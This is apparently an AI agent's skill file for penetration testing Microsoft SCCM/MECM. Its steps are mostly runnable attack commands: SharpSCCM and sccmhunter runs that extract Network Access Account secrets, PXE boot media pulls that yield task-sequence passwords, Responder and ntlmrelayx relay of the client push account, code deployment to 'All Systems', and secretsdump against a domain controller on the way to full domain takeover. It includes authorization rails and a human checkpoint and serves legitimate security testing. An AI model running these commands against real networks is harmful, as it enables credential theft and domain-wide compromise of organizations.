---
name: hunt-sccm
description: >
  SCCM/MECM attack techniques: NAA credential
  theft, hierarchy takeover, PXE abuse, task
  sequence secrets, client push abuse,
  deployment exploitation. Refined 0 times.
allowed_tools:
  - Bash(SharpSCCM*:*, sccmhunter*:*,
    crackmapexec:*, netexec:*, ldapsearch:*,
    secretsdump*:*, nmap:*, wmic:*, reg:*)
  - Read
  - Grep
  - Glob
  - WebSearch
when_to_use: >
  SCCM/MECM/ConfigMgr infrastructure detected
  in AD environment. Triggers: "SCCM attack",
  "MECM", "ConfigMgr", "client push",
  "PXE boot attack", "NAA credentials",
  "site server", "distribution point"
argument-hint: "[SCCM_SERVER domain/user:pass]"
---

# Hunt: SCCM/MECM Attacks

## Success Rate
- Times used: 0
- Vulns found: 0
- Last refined: N/A
- Avg severity: Critical
- Avg bounty: $15,000 - $50,000

## Goal
Compromise SCCM/MECM infrastructure for
mass deployment access, credential theft,
or lateral movement across all managed
endpoints.

## Technique

### Step 1: Detect SCCM Infrastructure
```bash
# LDAP: Find SCCM site objects
ldapsearch -x -H ldap://DC_IP \
  -b "DC=domain,DC=local" \
  -D "user@domain.local" -W \
  "(objectClass=mSSMSSite)" \
  mSSMSSiteName mSSMSRoamingBoundaries

# LDAP: Find SCCM system containers
ldapsearch -x -H ldap://DC_IP \
  -b "CN=System Management,CN=System,DC=domain,DC=local" \
  -D "user@domain.local" -W \
  "(objectClass=*)"

# DNS: Find SCCM servers
nslookup -type=SRV _mssms._tcp.domain.local
dig SRV _mssms._tcp.domain.local

# Network scan for SCCM ports
nmap -p 8530,8531,443,80,10123 \
  SCCM_SUBNET --open

# sccmhunter (automated discovery)
sccmhunter find -u user -p password \
  -d domain.local -dc-ip DC_IP
```

**Success criteria**: SCCM site server,
management point, distribution point
identified.

**Artifacts**: SCCM server IPs, site code,
hierarchy structure.

### Step 2: Enumerate SCCM Config
```bash
# sccmhunter full enumeration
sccmhunter show -u user -p password \
  -d domain.local -dc-ip DC_IP

# Check your SCCM permissions
sccmhunter admin -u user -p password \
  -d domain.local -dc-ip DC_IP

# Enumerate collections and deployments
sccmhunter show -users -u user -p password \
  -d domain.local -dc-ip DC_IP
sccmhunter show -collections \
  -u user -p password \
  -d domain.local -dc-ip DC_IP
```

**Success criteria**: Site hierarchy map,
role permissions, collections list.

### Step 3: NAA Credential Theft

The Network Access Account (NAA) is often
over-privileged and stored locally on all
SCCM clients with reversible encryption.

```bash
# From a managed client (local admin needed):

# WMI method
SharpSCCM.exe local secrets -m wmi

# Disk method (from CIM repository)
SharpSCCM.exe local secrets -m disk

# sccmhunter from network
sccmhunter dpapi -u user -p password \
  -d domain.local -dc-ip DC_IP \
  -target CLIENT_IP
```

**Success criteria**: NAA credentials
extracted in plaintext. Check what access
the NAA account has (often Domain Admin
or overprivileged service account).

**Artifacts**: NAA username + password.

### Step 4: PXE Boot Abuse
```bash
# If PXE boot is enabled without password:

# 1. Request PXE boot media
# sccmhunter or manual TFTP
tftp SCCM_DP_IP -c get \
  "\\SMSTemp\\<package>\\boot.wim"

# 2. Mount boot.wim, extract task sequence
# Task sequences often contain:
# - Domain join credentials
# - Local admin passwords
# - NAA credentials
# - Application install credentials

# 3. Parse task sequence XML
# Search for <Variable name="*Password*">
# and <Variable name="*Credential*">
```

**Success criteria**: Credentials extracted
from PXE boot media / task sequences.

### Step 5: Client Push Account Abuse
```bash
# If SCCM uses Automatic Client Push:
# The push account has local admin on ALL
# managed machines

# 1. Identify push account
sccmhunter show -pushaccounts \
  -u user -p password \
  -d domain.local -dc-ip DC_IP

# 2. Coerce push account to authenticate
# Set up Responder on network
Responder.py -I eth0

# 3. Relay push account credentials
# Push account usually has local admin
# everywhere → relay for code execution
ntlmrelayx.py -tf managed_hosts.txt \
  -smb2support -c "whoami"
```

**Success criteria**: Push account
credentials captured or relayed.

### Step 6: SCCM Site Server Takeover
```bash
# If you have admin on the site server or
# can relay a machine account to it:

# 1. Takeover via SCCM admin role
sccmhunter admin -u admin -p password \
  -d domain.local -dc-ip DC_IP

# 2. Deploy application to "All Systems"
sccmhunter exec -u admin -p password \
  -d domain.local -dc-ip DC_IP \
  -p "cmd.exe /c whoami > C:\\proof.txt" \
  -collection "All Systems"

# 3. Or deploy script
sccmhunter exec -u admin -p password \
  -d domain.local -dc-ip DC_IP \
  -script "Get-Process" \
  -collection "All Systems"
```

**Success criteria**: Code execution on
all managed machines via SCCM deployment.

**[human] checkpoint**: CRITICAL — mass
deployment affects all machines. Confirm
authorization and scope.

### Step 7: SCCM → Domain Admin Path
```bash
# Path 1: NAA is DA → direct win
# Path 2: NAA has local admin on DC → SAM dump
secretsdump.py DOMAIN/NAA_USER:NAA_PASS@DC_IP

# Path 3: Deploy to DC via SCCM
sccmhunter exec -u admin -p password \
  -d domain.local -dc-ip DC_IP \
  -p "cmd.exe /c whoami" \
  -target DC_HOSTNAME

# Path 4: Client push account → relay to DC
ntlmrelayx.py -t DC_IP -smb2support
```

**Success criteria**: Domain Admin achieved
through SCCM attack path.

## Patterns That Work

| Pattern | Context | Confidence |
|---------|---------|------------|
| NAA with DA privileges | Older SCCM setups | 10 |
| PXE without password | No PXE password set | 9 |
| Client push auto-install | Push account overprivileged | 9 |
| Site server admin access | Compromised SCCM admin | 10 |
| Task sequence credentials | Credentials in cleartext | 8 |

## False Positive Filters
- Enhanced HTTP (EHTTP): newer SCCM versions
  use per-device certificates → NAA may not
  exist → check if site uses Enhanced HTTP
- gMSA as NAA: can't extract password
  directly → different attack path needed
- PXE password required: brute-force may
  be needed or skip PXE path
- SCCM in CAS hierarchy: site server
  compromise may not give full control →
  need to reach CAS (Central Admin Site)

## Chain Potential
```
SCCM NAA → local admin on servers
  → credential dump → DA password
  → DCSync → full domain

SCCM site admin → deploy to all machines
  → instant domain-wide code execution
  → mass credential harvest

Coercion of SCCM server → relay to AD CS
  → SCCM machine cert → site takeover
```

## Safety Rails
- Authorized pentest engagement only
- **NEVER deploy to "All Systems" without
  explicit written authorization**
- Use safe payloads for proof (whoami, hostname)
- Clean up any deployments after testing
- Don't exfiltrate real data from managed clients
- Document every deployment with timestamp

## Changelog
- Initial creation: NAA, PXE, client push,
  site takeover, hierarchy abuse techniques
